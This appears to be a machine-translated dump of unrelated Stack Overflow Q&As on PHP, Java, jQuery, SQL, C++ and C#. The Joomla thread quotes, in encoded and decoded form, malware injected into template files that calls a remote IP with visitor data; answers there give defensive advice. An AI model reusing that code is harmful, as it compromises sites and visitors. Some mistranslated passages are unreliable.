> 标签：php, html, hyperlink, directory, relative-path

我已经在互联网的尽头搜索了这个问题的答案，我即将得出一个合乎逻辑的结论，即这是不可能的。当包含在不同目录/级别中具有其他多个文件依赖于它的文件时，究竟是如何使用相对根？

例如，这是我网站的简化树：

```
 Main site (PHP reports the main root to be: /Users/Luke/Sites/)
 -> index.php
 -> directoryfolder - > secondaryindex.php

 -> templates -> header.php 
              -> navigation.php 
```

即，如果要在Finder 中导航到index.php，他们会看到目录为/Users/Luke/Sites/SiteAlpha/index.php。

index.php 和 directoryfolder/secondaryindex.php 都包含 header.php，然后包含 navigation.php。问题似乎是，无论我在 header.php 上命名 navigation.php 的包含位置，它都只会允许一个页面正确显示它。IE：

如果在 index.php 上调用 navigation.php（通过 header.php），包含位置为 ROOT_PATH.'/templates/navigation.php（其中 ROOT_PATH 等于 dirname( `__DIR__`)），它根本不会显示。但它适用**于**secondaryindex.php。

反之亦然。如果在 index.php 上调用 navigation.php（通过 header.php），包含位置为 ROOT_PATH.'/siteAlpha/templates/navigation.php，它实际上会工作。但是它不适用于secondaryindex.php。

TL;DR，由于 header.php 被不同目录级别的多个页面调用，navigation.php 的包含必须同时是我的第一个示例和我的第二个示例。

我尝试使用我自己定义的根常量 $_SERVER['DOCUMENT_ROOT'], dirname( `__DIR__`), `__FILE__`，但没有任何成功。我已经阅读了无数文章和 SO 问题，但没有任何帮助。它只是行不通。

有人可以给我一个 ELI5 解释，说明我需要做什么才能使其正常工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:10:47.013

首先，我确信一个应用程序应该只有一个入口点。根据您的情况，如果设置了特定参数，您可以在 index.php 中包含 secondayrindex.php。与模板类似的情况：构建一个包含navigation.php 和header.php 的模板。然后你必须只包含单个模板。或者使用像 smarty 这样的模板引擎，它为你做了很多工作（*躲起来*请不要打我，模板引擎的仇恨者）

回到你的情况。我为您看到了一些可能的解决方案：

*   *在入口点文件中使用应用程序*的根目录定义一个常量（例如 index.php - 最适合我的想法是只有一个入口点）
    *   在 index.php 中可能是`define('APP_ROOT', __DIR__)`
    *   在 secondaryindex.php 中可能是`define('APP_ROOT', dirname(__DIR__))`
    *   Of course you must be aware of not including index.php and secondaryindex.php at the same time
*   use only relative paths
    *   Including navigation.php in header.php would be `require('navigation.php')`
    *   Including header.php in index.php would be `require('templates' . DIRECTORY_SEPARATOR . 'header.php')`
    *   Including header.php in secondaryindex.php would be `require('..' . DIRECTORY_SEPARATOR . 'templates' . DIRECTORY_SEPARATOR . 'header.php')`

Btw: Think of doing sth like this: `define('DS', DIRECTORY_SEPARATOR)` - writing `DIRECTORY_SEPARATOR` will drive you crazy.

I'm currently in the stage of using absolute paths only while defining a root directory constant at the entry point or a file included into the entry point which defines all necessary constants.

Hope this could help.

# java - Querydsl 空安全连接

> ID：14977812
> 
> 赞同：4
> 
> 时间：2013-02-20T10:40:33.363
> 
> 标签：java, database, null, data-access-layer, querydsl

假设您在对应于类的表中有以下数据`Person`，那么安全地搜索空域和字段连接的正确方法是`name1`什么`name2`？

```
@Entity
public class Person {
    Long id;
    String name1;
    String name2;
    // Getters and setters omitted for brevity
} 
```

```
编号 | 名称1 | 名称2   
----------------------
1 | 福 | 空值
2 | 空 | 酒吧
3 | 福 | 酒吧

```

默认情况下，`null`如果其中一个为空，则连接两列会导致结果。

```
public List<String> nameConcatenations() {
    JPAQuery q = new JPAQuery(entityManager);
    QPerson person = QPerson.person;
    StringExpression nameConcatenation = person.name1.concat(person.name2);
    return q.from(person).list(nameConcatenation)
} 
```

上面的代码产生以下列表：

```
null
null
FooBar 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-20T10:40:33.363

一种简单的方法是使用`COALESCE`在 Querydsl 中具有等效功能的 SQL 函数

```
public List<String> nameConcatenations() {
    JPAQuery q = new JPAQuery(entityManager);
    QPerson person = QPerson.person;
    StringExpression nameConcatenation = emptyIfNull(person.name1)
        .concat(emptyIfNull(person.name2));
    return q.from(person).list(nameConcatenation)
}

private static StringExpression emptyIfNull(StringExpression expression) {
    return expression.coalesce("").asString();
} 
```

将产生以下列表：

```
Foo
Bar
FooBar 
```

# jquery - 使用 for 循环更改/增加 td 的标题 - JQuery

> ID：14977814
> 
> 赞同：0
> 
> 时间：2013-02-20T10:40:32.897
> 
> 标签：jquery, for-loop, title, html-table

我需要为我的表格单元格分配数字，这些数字从一个单元格到另一个单元格递增。我尝试了一个forloop，但是在每次循环之后将递增的计数器分配给单元格的标题时遇到了麻烦。我有这个代码 -

```
$(function(){
var row = $('#seat_map tr:last td.freeSeat')
for(i=0; i<row.length; i++){
        row.attr('title', i);   
    }
}); 
```

此代码仅在循环完成后将 i 的最终值分配给所有单元格的标题...而不是将 '1、2、3' 等分配给标题。我也许应该补充一点，该表也是使用 jquery 动态生成的。为模糊的标题和描述道歉 - 我尽力了！

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:49:58.270

Use [**.each()**](http://api.jquery.com/each/) function of jquery

> The .each() method is designed to make DOM looping constructs concise and less error-prone. When called it iterates over the DOM elements that are part of the jQuery object. Each time the callback runs, it is passed the current loop iteration, beginning from 0\. More importantly, the callback is fired in the context of the current DOM element, so the keyword this refers to the element.

**jQuery:**

```
$('#seat_map tr:last td.freeSeat').each(function(index){
    $(this).attr('title', index+1)
}) 
```

[**DEMO**](http://jsfiddle.net/KX5xL/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:42:40.393

好吧，`.each()`无论如何你都可以使用

```
var row = $('#seat_map tr:last td.freeSeat');
$.each(row, function(index){
    $(this).attr('title', index+1);
}); 
```

但实际上，您可以直接从选择器中执行此操作。

```
$('#seat_map tr:last td.freeSeat').each(function(index) {
    $(this).attr('title', index+1);
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:43:04.027

> *“此代码仅在循环完成后将 i 的最终值分配给所有单元格的标题”*

这是因为在每次迭代中，您都在设置每个匹配元素的属性。（对jQuery 对象`row.attr('title',i)`中的每个元素进行操作。）`row`

如果您使用 jQuery，您会发现使用它的[`.each()`方法](http://api.jquery.com/each/)比使用传统`for`循环更简单：

```
$(function(){
    var rows = $('#seat_map tr:last td.freeSeat');
    rows.each(function(i) {
       $(this).attr('title',i);
    });
}); 
```

除非您稍后将其用于其他用途，否则您根本不需要该`rows`变量：

```
$(function(){
    $('#seat_map tr:last td.freeSeat').each(function(i) {
       $(this).attr('title',i);
    });
}); 
```

但是要使用`for`循环来执行此操作，您可以使用该[`eq()`方法](http://api.jquery.com/eq/)来访问当前项目：

```
$(function(){
    var row = $('#seat_map tr:last td.freeSeat')
    for(i=0; i<row.length; i++){
        row.eq(i).attr('title', i);   
    }
}); 
```

`i`这些方法中的任何一个都将以at开头`0`，因此`i+1`如果您希望显示的编号以 开头，请使用`1`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:49:51.633

Try this:

```
$(function(){
   var row = $(document).children('#seat_map tr:last').find('td.freeSeat');
   for(i=0; i<row.length; i++){
      row.attr('title', i);   
   }
}); 
```

or this:

```
$(function(){
   var row = $('#seat_map tr:last td.freeSeat', this);
   for(i=0; i<row.length; i++){
      row.attr('title', i);   
   }
}); 
```

As you mentioned *`I should perhaps add that the table is dynamically generated using jquery`*

# php - 网站后门 & eval()

> ID：14977819
> 
> 赞同：3
> 
> 时间：2013-02-20T10:40:52.090
> 
> 标签：php, joomla, joomla1.7

我正在运行一个今天被黑的 Joomla 1.7 网站。下面的脚本做了黑客攻击。

```
eval((base64_decode("DQoNCnByaW50IEBmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzkzLjExNS44Ni4xNjgvaGxpbmtzL2xpbmtzLnBocD91YT0nIC4gQHVybGVuY29kZSgkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pIC4gJyZyZXE9JyAuIEB1cmxlbmNvZGUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4gJy8nIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pKTsNCg0K"))); 
```

上面的行被注入到我`index.php`的模板文件夹文件中。文件夹中的每个模板都有上述代码。在每个文件中都重复了几次。

当我解码代码时，它输出

```
print @file_get_contents('http://93.115.86.168/hlinks/links.php?ua=' . @urlencode($_SERVER['HTTP_USER_AGENT']) . '&req=' . @urlencode($_SERVER['HTTP_HOST'] . '/' . $_SERVER['REQUEST_URI'])); 
```

我删除了脚本，站点恰好可以正常工作。脚本没有做任何坏事，只是网站根本没有加载。

我的问题是即使我将文件权限设置为 644 并将文件夹权限设置为 755，这怎么会发生？

我怎样才能找出导致问题的原因？我应该采取哪些措施来防止将来发生这种情况？

# 更新

这个[论坛帖子助手/ FPA](http://forum.joomla.org/viewtopic.php?f=621&t=582860)非常有帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:47:25.707

它不是从您的文件系统读取文件，而是直接从外部 URL 读取。您可以通过 php.ini 设置禁用从 php 中的任何外部 URL 读取：

```
allow_url_fopen = 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T11:00:19.913

怎么样，因为您运行的是 Joomla 1.7 网站？Joomla 1.7 不再受支持，自发布以来，已在 Joomla 中添加了几个安全修复程序。您应该立即升级到 2.5.9。应该没有向后兼容性问题，因为 2.5.9 只是 Joomla 1.7 的长期支持版本。

[按照此处](http://docs.joomla.org/Security_Checklist/Hosting_and_Server_Setup)的 Joomla 安全检查表中的建议检查您的 PHP 设置。确保您的 PHP 和 MYSQL 版本是最新的（至少 PHP 5.3.x - 最好是 5.4.x 和 MYSQL 至少 5.0.4）。

最后确保您的所有扩展都是最新的。同样，开发人员不断更新模块，不仅是为了添加新功能，而且是为了添加额外/改进的安全性或防止发现的漏洞！

另外请不要像 Steven 所说的那样打开 allow_url_fopen 会导致 Joomla 的一键更新停止正常工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T11:00:49.713

根据您告诉我们的内容，不可能确定黑客入侵的原因，但最可能的原因（几乎可以肯定）是您正在运行某些软件的旧版本，这些软件已知安全漏洞，黑客能够攻击。

*   检查您的 PHP 版本：如果它低于 v5.3.21 或 v5.4.11（即当前版本），您可能存在安全漏洞。如果它是 v5.2 或更低版本，那么它肯定是易受攻击的（5.2 已经两年不支持了）。如果您的托管服务提供商的 PHP 版本不是最新的，那么您需要麻烦他们来修复它。如果他们不修复它，您需要找到更好的主机。

*   检查您的 joomla 版本：它是最新的吗？你提到它是 v1.7：这不是最新的 1.7 是一年半前发布的。当前版本为 2.5 和 3.0。这意味着您几乎可以肯定其中存在安全漏洞，这意味着您可能会被黑客入侵。从 1.7 升级到 2.5 可能会很痛苦，但如果你想安全，你必须这样做。

使您的软件保持最新是您在网站上可以做的最重要的事情之一，以确保其安全。这不是可选的：如果您想避免被黑客入侵，您需要保持最新状态，并且您需要不断关注新版本——新的安全漏洞一直在被发现。通常，大多数优质软件在出现新错误时会很快得到修复，但您有责任在您的服务器上安装已修复的版本，否则错误仍然存​​在并且很可能被黑客入侵。

还有其他可能被黑客入侵的方式；让我们不要打折；他们中的大多数都在你的控制之外。保持软件版本更新是您的第一大最佳防御措施。

# php - mysql 列的总和

> ID：14977823
> 
> 赞同：0
> 
> 时间：2013-02-20T10:41:06.373
> 
> 标签：php, mysql, sum

我有这样的情况：

```
- name    value
-------------
- stuff_1  2
- stuff2   5
- stuff2   3
- stuff_1  4 
```

* * *

我必须使用哪个 mysql 查询来对所有这些值求和并得到如下结果：

```
- name    value
-------------
- stuff_1  2+4=6
- stuff2   5+3=8 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:43:20.213

你需要这样的东西：

```
select name, sum(value) from table_name group by name 
```

看看那里列出的 MySQL [GROUP BY和聚合函数](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:43:54.897

干得好：

```
SELECT name, SUM(value) FROM your_table GROUP BY name; 
```

# php - apache php > 用户请求

> ID：14977830
> 
> 赞同：6
> 
> 时间：2013-02-20T10:41:40.447
> 
> 标签：php, multithreading, apache, request, response

您好，我的问题是数据流在 Apache Web 服务器 + PHP 中是如何工作的。

当用户访问 url: localhost/index.php 并且在同一时间当另一个用户访问相同的 url 我猜请求被一个接一个地执行（不是多线程的）并且第一个用户得到响应然后另一个。

问题是：如果第一个请求像 1 分钟一样长时间保持循环，其他用户应该等待第一个请求完成，然后他们的请求完成，以便从 Apache Web 服务器 + PHP 获得响应？如果答案是肯定的（其他用户应该在队列中等待）：我们可以让请求并行（多线程）执行以防止在队列中等待

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-20T10:52:01.837

虽然 PHP 可能是单线程的，但 Apache 可以运行多进程和多线程。这允许同时执行许多请求。实际上，您可以配置同时请求的数量。

您实际上可以看到 Apache 实时服务这些请求，查看哪些正在等待，哪些正在通过 mod_status ( [http://httpd.apache.org/docs/2.2/mod/mod_status.html](http://httpd.apache.org/docs/2.2/mod/mod_status.html) ) 提供服务。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T10:54:57.343

Apache 有多个线程，因此可以同时运行多个 PHP 脚本。

诸如 Nginx 之类的 Web 服务器使用事件驱动的架构。异步 I/O 和所有的爵士乐。

Web 服务器通常具有某种机制，使它们能够一次处理多个请求，或者至少使它们看起来可以处理。

Apache 使用线程，Nginx 使用事件循环，但在您想要的意义上它们不是串行的。原因很简单：浪费资源。当您的 PHP 脚本正在等待硬盘移动到正确的位置以便您可以从正在读取的文件中读取一个块时，您还不如做其他事情，即。现在处理另一个不需要 I/O 的请求。

如果在其他用户发出请求之前完成某些请求至关重要，您应该考虑切换到更加解耦的异步架构。我不知道您对当前解决方案的投入程度。事件处理可以简单地实现为简单的轮询甚至是[长轮询](http://en.wikipedia.org/wiki/Push_technology#Long_polling)。

# android - Android在后台运行任务时关闭屏幕

> ID：14977835
> 
> 赞同：3
> 
> 时间：2013-02-20T10:41:55.417
> 
> 标签：android, camera, motion-detection

我在android应用程序中有一个要求，我想在没有检测到运动时关闭屏幕（运动检测是使用相机完成的）。

但是相机应该在后台运行并在屏幕关闭时拍照，一旦检测到运动，就应该打开屏幕。

我怎么能在android中做到这一点？

我进行了很多搜索并实现了一些东西，但无法达到预期的结果。

请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:02:58.523

我不认为这是可能的。要拍照，`Camera`该类需要它，`SurfaceHolder`并且它需要在屏幕上绘制框架以使捕获工作。

# php - 如何在 while 循环中附加到数组：$rows[] = $row;？

> ID：14977838
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:42:10.233
> 
> 标签：php, mysqli

我需要帮助，我尝试了获取的行，但无法将其附加到`while`循环中的数组中：`$rows[] = $row;`然后尝试稍后在 foreach 中构建`$rows array`then 输出。

我该怎么做呢？

```
 <?php
    $query = $dbc->query('SELECT * FROM customer');
    $rows = array();
    while ($row = $query->fetch_assoc()) {
        echo $row['clientid'].' '.$row['inital'].' '.$row['firstname'].' '.$row['lastname'].' '.$row['mobile'].' '.$row['landline'].' '.$row['email'].' '.$row['address'].' '.$row['postcode'];
    }
 foreach ($rows as $row) { 
 ?>
  <td><?php $row['clientid']; ?></td>
  <td><?php $row['inital']; ?></td> 
  <td><?php $row['firstname']; ?></td>
  <td><?php $row['lastname']; ?></td>
  <td><?php $row['mobile']; ?></td>
  <td><?php $row['landline']; ?></td>
  <td><?php $row['email']; ?></td>
  <td><?php $row['address']; ?></td>
  <td><?php $row['postcode']; ?></td>
  </td>
  <?php } ?> 
```

最后我是这样做的

```
 <?php
  $query = $dbc->query('SELECT * FROM customer');
if ( mysqli_num_rows( $query ) > 0 )
{
  while ( $row = mysqli_fetch_array( $query, MYSQLI_ASSOC ))
  {
 echo "<tr><td>".$row['clientid']."</td><td>".$row['inital']."</td><td>".$row['firstname']."</td><td>".$row['lastname']."</td><td>".$row['mobile']."</td><td>".$row['landline']."</td><td>".$row['email']."</td><td>".$row['address']."</td><td>".$row['postcode']."</td></tr>";
  }
  echo '</tbody></table>' ;
}
else { echo '<div class="alert alert-error">
There are currently no records.
</div>' ; }
    ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:47:06.463

我不知道你为什么想要 $rows 中的所有记录并重复使用 foreach 两次，但你仍然可以这样做，

```
$rows = array();
while ($row = $query->fetch_assoc()) {
   $rows[] = $row;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:52:32.773

Your variable $rows is initialized as an array, but is not being used.

```
while ($row = $query->fetch_assoc()) {
    $rows[] = $row;
} 
```

This will create an array of all your $row

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:49:22.107

请使用回车和制表符。

另外，为什么要构建 rows 数组？fetch_assoc 为你做这件事

```
<?php while ($row = $query->fetch_assoc()) { ?> 
    <td><?php echo $row['clientid']; ?></td> 
    <td><?php echo $row['inital']; ?></td> 
    <td><?php echo $row['firstname']; ?></td> 
    <td><?php echo $row['lastname']; ?></td> 
    <td><?php echo $row['mobile']; ?></td> 
    <td><?php echo $row['landline']; ?></td> 
    <td><?php echo $row['email']; ?></td> 
    <td><?php echo $row['address']; ?></td> 
    <td><?php echo $row['postcode']; ?></td> 
    <td><?php echo $row['accessibility']; ?></td> 
<?php } ?> 
```

或者，如果您想分两步完成

```
$rows = $query->fetch_all();

...

<?php foreach ($rows as $row) { ?> 
    <td><?php echo $row['clientid']; ?></td> 
    <td><?php echo $row['inital']; ?></td> 
    <td><?php echo $row['firstname']; ?></td> 
    <td><?php echo $row['lastname']; ?></td> 
    <td><?php echo $row['mobile']; ?></td> 
    <td><?php echo $row['landline']; ?></td> 
    <td><?php echo $row['email']; ?></td> 
    <td><?php echo $row['address']; ?></td> 
    <td><?php echo $row['postcode']; ?></td> 
    <td><?php echo $row['accessibility']; ?></td> 
<?php } ?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:49:59.143

回答你的问题：

```
while ($row = $query->fetch_assoc()) {
    $rows[] = $row;
    echo $row['clientid'].' '.$row['inital'].' '.$row['firstname'].' '.$row['lastname'].' '.$row['mobile'].' '.$row['landline'].' '.$row['email'].' '.$row['address'].' '.$row['postcode'].' '.$row['accessibility'];
} 
```

但是，您可以采取另一种方法来解决此问题。为什么不简单地使用`while`循环来打印行？

```
while ($row = $query->fetch_assoc()) {
?>
<td><?php $row['clientid']; ?></td>
<td><?php $row['inital']; ?></td> 
<td><?php $row['firstname']; ?></td>
<td><?php $row['lastname']; ?></td>
<td><?php $row['mobile']; ?></td>
<td><?php $row['landline']; ?></td>
<td><?php $row['email']; ?></td>
<td><?php $row['address']; ?></td>
<td><?php $row['postcode']; ?></td>
<td><?php $row['accessibility']; ?></td>
<?php } ?> 
```

或者，如果您只需要数组中的行，您可以使用[`fetchAll()`](http://php.net/manual/en/pdostatement.fetchall.php)，如下所示：

```
$rows = $query->fetchAll(PDO::FETCH_ASSOC); 
```

# c++ - 缓存位置性能

> ID：14977845
> 
> 赞同：2
> 
> 时间：2013-02-20T10:42:30.763
> 
> 标签：c++, c, performance, optimization

如果我有一个 C 或 C++ 程序，我在整个程序中使用 20 个整数，那么创建一个大小为 20 的数组来存储整数然后为每个数字创建别名会提高性能吗？

这会改善缓存局部性（而不仅仅是创建 20 个普通整数），因为整数将作为整数数组的一部分一起加载到缓存中（或者至少，提高这种可能性）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:45:37.993

问题是如何为它们分配空间？我怀疑你只是`new int`在代码中随意地做 20 次。如果它们是局部变量，那么它们将进入堆栈并被缓存。

主要问题是这值得打扰吗？首先尝试以可读和优雅的方式编写程序，然后尝试消除主要瓶颈，并且只有在开始弄乱微优化之后。如果您正在处理 20 个整数，它们本质上不应该是数组吗？

还是理论问题？如果是，那么是的，数组可能会比内存中的 20 个随机区域缓存得更好。如果这是一个实际问题，那么我怀疑这是否真的很重要，除非您正在编写超临界性能代码，即使这样，微优化也是最后要处理的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:59:01.357

它可能会提高性能一点，是的。它也可能完全毁掉你的表现。或者它可能没有任何影响，因为编译器已经为你做了类似的事情。或者它可能没有影响，因为您只是没有经常使用这些整数来产生影响。

它还取决于一个或多个线程是否访问这些整数，以及它们是否只是读取或修改数字。（如果您有多个线程并且您写入这些整数，那么将它们放在一个数组中会导致错误共享，这将比您希望获得的任何东西都更严重地损害您的性能）

那你为什么不试试呢？

没有简单、单一的答案。你会得到的唯一*严肃的答案是“这取决于”。*如果您想知道它在*您的*情况下的表现，那么您有两种选择：

1.  试试看会发生什么，或者
2.  全面了解 CPU 的工作原理，收集有关这些值的准确访问频率和模式的数据，以便您可以有根据地猜测更改将如何影响您的性能。

如果您选择#2，您可能需要继续使用#1，以验证您的猜测是否正确。

性能并不简单。几乎没有*通用*规则，一切都取决于上下文。在一种情况下作为优化的更改可能会在另一种情况下减慢一切。

如果您认真考虑优化您的代码，那么上面的两个步骤是无可替代的。如果您对此不认真，请不要这样做。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:47:37.923

是的，理论上 20 个整数出现在同一缓存行上的可能性会更高，尽管我认为一个好的编译器几乎总是能够为您复制相同的性能，即使不使用数组也是如此。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-20T10:55:46.273

那么，您目前在`int positionX, positionY, positionZ;`其他地方还有`int fuzzy;`,`int foo;`等等来制作大约 20 个整数？

你想做这样的事情：

```
int arr[20];
#define positionX arr[0]
#define positionY arr[1]
#define positionZ arr[2]
#define fuzzy     arr[3]
#define foo       arr[4] 
```

我希望如果存在任何性能差异，它可能会使其变慢，因为编译器会注意到您正在`arr`其他地方使用，因此不能使用寄存器来存储 的值`foo`，因为它看到您调用`update_position`这倒是`arr[0]..arr[2]`。这取决于编译器对“我们正在接触相同的数据”的检测有多细。而且我怀疑它可能经常基于“对象”而不是对象的单个字段 - 特别是对于数组。

但是，如果您确实有紧密使用的数据，例如位置变量，则将它们彼此相邻可能会有所帮助。

但我认真地认为你是在浪费时间试图将变量放在一起，并且使用数组几乎可以肯定是一个坏主意。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-20T11:37:00.633

它可能会降低性能。当您不查看时，现代编译器会在内存中移动变量，并且可能在不同时使用时将两个变量存储在同一地址。根据您的数组想法，这些变量不能重叠，并且必须使用不同的缓存行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-06-12T07:07:16.163

是的，这可能会提高你的性能，但它可能不会，因为它真正的变量应该一起使用，应该存储在一起。

因此，如果它们一起使用，那么可以。变量和对象确实应该在使用它们的函数中声明，因为它们将存储在堆栈中（大多数情况下为一级缓存）。

所以是的，如果你打算一起使用它们，即它们彼此相关，那么这可能会更有效率，前提是你还考虑了如何分配它们的内存。

# c# - 如何使用 JSON.NET 确保字符串是有效的 JSON

> ID：14977848
> 
> 赞同：181
> 
> 时间：2013-02-20T10:42:37.123
> 
> 标签：c#, json.net

我有一个原始字符串。我只想验证字符串是否是有效的 JSON。我正在使用 JSON.NET。

* * *

## 回答 #1

> 赞同：267
> 
> 时间：2013-02-20T10:46:08.840

**通过代码：**

最好的办法是在 a 中使用 parse`try-catch`并在解析失败的情况下捕获异常。*（我不知道任何`TryParse`方法）*。

***（使用 JSON.Net）***

最简单的方法是`Parse`使用[`JToken.Parse`](http://www.newtonsoft.com/json/help/html/ParseJsonAny.htm), 并检查字符串是否分别以or开头和以`{`or`[`结尾*（从这个**[答案](https://stackoverflow.com/questions/11835593/validate-a-string-to-be-json-or-not-in-asp-net)**添加）*：`}``]`

```
private static bool IsValidJson(string strInput)
{
    if (string.IsNullOrWhiteSpace(strInput)) { return false;}
    strInput = strInput.Trim();
    if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
        (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
    {
        try
        {
            var obj = JToken.Parse(strInput);
            return true;
        }
        catch (JsonReaderException jex)
        {
            //Exception in parsing json
            Console.WriteLine(jex.Message);
            return false;
        }
        catch (Exception ex) //some other exception
        {
            Console.WriteLine(ex.ToString());
            return false;
        }
    }
    else
    {
        return false;
    }
} 
```

*`{`添加or等​​检查的原因`[`是基于`JToken.Parse`将解析值（例如`"1234"`or`"'a string'"`作为有效令牌）的事实。另一种选择可能是同时使用`JObject.Parse`和`JArray.Parse`解析并查看其中是否有人成功，但我相信检查`{}`并且`[]`应该更容易。* *（感谢@RhinoDevel[指出](https://stackoverflow.com/questions/14977848/how-to-make-sure-that-string-is-valid-json-using-json-net/14977915#comment55540771_14977915)）*

***没有 JSON.Net***

您可以利用 .Net framework 4.5 [System.Json 命名空间](https://msdn.microsoft.com/en-us/library/system.json(v=vs.110).aspx)，例如：

```
string jsonString = "someString";
try
{
    var tmpObj = JsonValue.Parse(jsonString);
}
catch (FormatException fex)
{
    //Invalid json format
    Console.WriteLine(fex);
}
catch (Exception ex) //some other exception
{
    Console.WriteLine(ex.ToString());
} 
```

*（但是，您必须`System.Json`使用命令通过 Nuget 包管理器安装：`PM> Install-Package System.Json -Version 4.0.20126.16343`在包管理器控制台上）*（取自[此处](https://stackoverflow.com/questions/12859319/json-does-not-exist-in-the-namespace-system)）

**非编码方式：**

通常，当有一个小的 json 字符串并且您试图在 json 字符串中查找错误时，我*个人*更喜欢使用可用的在线工具。我通常做的是：

*   将JSON 字符串粘贴到[JSONLint JSON 验证器](http://jsonlint.com/)中并查看它是否是有效的 JSON。
*   稍后将正确的 JSON 复制到[http://json2csharp.com/](http://json2csharp.com/)并为其生成模板类，然后使用 JSON.Net 对其进行反序列化。

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2013-11-26T13:30:05.957

使用`JContainer.Parse(str)`方法检查 str 是否是有效的 Json。如果这引发异常，则它不是有效的 Json。

`JObject.Parse`- 可用于检查字符串是否为有效的 Json 对象
`JArray.Parse`- 可用于检查字符串是否为有效的 Json 数组
`JContainer.Parse`- 可用于检查 Json 对象和数组

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2015-07-14T10:38:50.323

基于 Habib 的回答，您可以编写一个扩展方法：

```
public static bool ValidateJSON(this string s)
{
    try
    {
        JToken.Parse(s);
        return true;
    }
    catch (JsonReaderException ex)
    {
        Trace.WriteLine(ex);
        return false;
    }
} 
```

然后可以这样使用：

```
if(stringObject.ValidateJSON())
{
    // Valid JSON!
} 
```

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2016-04-23T06:54:40.463

只是为了在@Habib 的答案中添加一些内容，您还可以检查给定的 JSON 是否来自有效类型：

```
public static bool IsValidJson<T>(this string strInput)
{
    if(string.IsNullOrWhiteSpace(strInput)) return false;

    strInput = strInput.Trim();
    if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
        (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
    {
        try
        {
            var obj = JsonConvert.DeserializeObject<T>(strInput);
            return true;
        }
        catch // not valid
        {             
            return false;
        }
    }
    else
    {
        return false;
    }
} 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2016-04-26T06:38:41.000

我发现 JToken.Parse 错误地解析了无效的 JSON，如下所示：

```
{
"Id" : , 
"Status" : 2
} 
```

将 JSON 字符串粘贴到[http://jsonlint.com/](http://jsonlint.com/) - 它是无效的。

所以我使用：

```
public static bool IsValidJson(this string input)
{
    input = input.Trim();
    if ((input.StartsWith("{") && input.EndsWith("}")) || //For object
        (input.StartsWith("[") && input.EndsWith("]"))) //For array
    {
        try
        {
            //parse the input into a JObject
            var jObject = JObject.Parse(input);

            foreach(var jo in jObject)
            {
                string name = jo.Key;
                JToken value = jo.Value;

                //if the element has a missing value, it will be Undefined - this is invalid
                if (value.Type == JTokenType.Undefined)
                {
                    return false;
                }
            }
        }
        catch (JsonReaderException jex)
        {
            //Exception in parsing json
            Console.WriteLine(jex.Message);
            return false;
        }
        catch (Exception ex) //some other exception
        {
            Console.WriteLine(ex.ToString());
            return false;
        }
    }
    else
    {
        return false;
    }

    return true;
} 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-06-15T17:36:35.557

`System.Text.Json`⚠️使用⚠️的替代选项

对于 .Net Core，还可以使用`System.Text.Json`命名空间并使用`JsonDocument`. 示例是基于命名空间操作的扩展方法：

```
public static bool IsJsonValid(this string txt)
{
    try { return JsonDocument.Parse(txt) != null; } catch {}

    return false;
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-01-06T15:07:47.573

关于汤姆比奇的回答；我想出了以下内容：

```
public bool ValidateJSON(string s)
{
    try
    {
        JToken.Parse(s);
        return true;
    }
    catch (JsonReaderException ex)
    {
        Trace.WriteLine(ex);
        return false;
    }
} 
```

使用以下内容：

```
if (ValidateJSON(strMsg))
{
    var newGroup = DeserializeGroup(strMsg);
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-02-06T17:04:15.480

`JToken.Type`解析成功后可用。这可用于消除上述答案中的一些前导，并为更好地控制结果提供洞察力。完全无效的输入（例如，`"{----}".IsValidJson();`仍然会抛出异常）。

```
 public static bool IsValidJson(this string src)
    {
        try
        {
            var asToken = JToken.Parse(src);
            return asToken.Type == JTokenType.Object || asToken.Type == JTokenType.Array;
        }
        catch (Exception)  // Typically a JsonReaderException exception if you want to specify.
        {
            return false;
        }
    } 
```

Json.Net 参考`JToken.Type`：[https ://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_Linq_JTokenType.htm](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_Linq_JTokenType.htm)

* * *

